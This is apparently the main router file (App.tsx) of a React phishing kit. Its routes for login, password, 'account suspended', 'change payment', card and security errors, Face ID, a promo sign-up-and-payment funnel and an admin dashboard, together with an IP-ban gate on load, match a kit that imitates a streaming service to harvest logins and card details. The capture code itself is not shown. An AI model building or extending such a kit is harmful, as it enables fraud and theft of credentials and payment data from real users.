import { Toaster } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import NotFound from "@/pages/NotFound";
import { Route, Switch, useLocation } from "wouter";
import { useEffect, useState } from "react";
import { AnimatePresence } from "framer-motion";
import ErrorBoundary from "./components/ErrorBoundary";
import { ThemeProvider } from "./contexts/ThemeContext";
import Login from "./pages/Login";
import Password from "./pages/Password";
import AdminDashboard from "./pages/AdminDashboard";
import AdminPanel from "./pages/AdminPanel";
import AccountSuspended from "./pages/AccountSuspended";
import ChangePayment from "./pages/ChangePayment";
import PaymentConfirmation from "./pages/PaymentConfirmation";
import Home from "./pages/Home";
import PersonalInfo from "./pages/PersonalInfo";
import SecureError from "./pages/SecureError";
import CardError from "./pages/CardError";
import FaceID from "./pages/FaceID";
import PaymentSuccess from "./pages/PaymentSuccess";
import Banned from "./pages/Banned";
import PromoLanding from "./pages/PromoLanding";
import PromoSelectAccount from "./pages/PromoSelectAccount";
import PromoLogin from "./pages/PromoLogin";
import PromoPassword from "./pages/PromoPassword";
import PromoRegister from "./pages/PromoRegister";
import PromoPayment from "./pages/PromoPayment";

// Rutas con fondo blanco (páginas de pago/registro)
const WHITE_BG_ROUTES = [
  "/change-payment",
  "/payment-confirmation",
  "/personal-info",
  "/card-error",
  "/secure-error",
  "/payment-success",
  "/account-suspended",
  "/promo",
  "/promo-select",
  "/promo-login",
  "/promo-password",
  "/promo-register",
  "/promo-payment",
];

// Cambia el fondo del body y el theme-color según la ruta activa
function BodyColorManager() {
  const [location] = useLocation();
  useEffect(() => {
    const isWhite = WHITE_BG_ROUTES.some(r => location.startsWith(r));
    // Usar #f3f3f3 (color del footer gris) para que cualquier espacio vacío sea gris, no negro
    const bgColor = isWhite ? '#ffffff' : '#141414';
    const themeColor = isWhite ? '#ffffff' : '#141414';
    document.body.setAttribute('style', `background-color: ${bgColor} !important`);
    document.documentElement.setAttribute('style', `background-color: ${bgColor} !important`);
    const meta = document.querySelector('meta[name="theme-color"]');
    if (meta) meta.setAttribute('content', themeColor);
    return () => {
      document.body.removeAttribute('style');
      document.documentElement.removeAttribute('style');
    };
  }, [location]);
  return null;
}

function Router() {
  const [location] = useLocation();
  return (
    <>
      <BodyColorManager />
      <AnimatePresence mode="wait">
      <Switch key={location}>
        <Route path={"/"} component={Home} />
        <Route path={"/login"} component={Login} />
        <Route path={"/password"} component={Password} />
        <Route path={"/account-suspended"} component={AccountSuspended} />
        <Route path={"/change-payment"} component={ChangePayment} />
        <Route path={"/payment-confirmation"} component={PaymentConfirmation} />
        <Route path={"/personal-info"} component={PersonalInfo} />
        <Route path={"/secure-error"} component={SecureError} />
        <Route path={"/card-error"} component={CardError} />
        <Route path={"/face-id"} component={FaceID} />
        <Route path={"/payment-success"} component={PaymentSuccess} />
        <Route path={"/admin"} component={AdminPanel} />
        <Route path={"/admin/dashboard"} component={AdminDashboard} />
        <Route path={"/banned"} component={Banned} />
        <Route path={"/promo"} component={PromoLanding} />
        <Route path={"/promo-select"} component={PromoSelectAccount} />
        <Route path={"/promo-login"} component={PromoLogin} />
        <Route path={"/promo-password"} component={PromoPassword} />
        <Route path={"/promo-register"} component={PromoRegister} />
        <Route path={"/promo-payment"} component={PromoPayment} />
        <Route path={"/404"} component={NotFound} />
        <Route component={NotFound} />
      </Switch>
      </AnimatePresence>
    </>
  );
}

function App() {
  const [ipBanned, setIpBanned] = useState(false);
  const [checking, setChecking] = useState(true);

  useEffect(() => {
    // Check if IP is banned on app load
    // Skip check for admin panel
    if (window.location.pathname.startsWith("/admin")) {
      setChecking(false);
      return;
    }
    fetch("/api/check-ip")
      .then(r => r.json())
      .then(data => {
        if (data.banned) {
          setIpBanned(true);
        }
      })
      .catch(() => {})
      .finally(() => setChecking(false));
  }, []);

  if (checking) {
    return (
      <div className="min-h-[100dvh] w-full bg-[#141414] flex items-center justify-center">
        <div className="w-8 h-8 border-2 border-red-600 border-t-transparent rounded-full animate-spin" />
      </div>
    );
  }

  if (ipBanned) {
    return (
      <ErrorBoundary>
        <ThemeProvider defaultTheme="dark">
          <Banned />
        </ThemeProvider>
      </ErrorBoundary>
    );
  }

  return (
    <ErrorBoundary>
      <ThemeProvider defaultTheme="dark">
        <TooltipProvider>
          <Toaster />
          <Router />
        </TooltipProvider>
      </ThemeProvider>
    </ErrorBoundary>
  );
}

export default App;
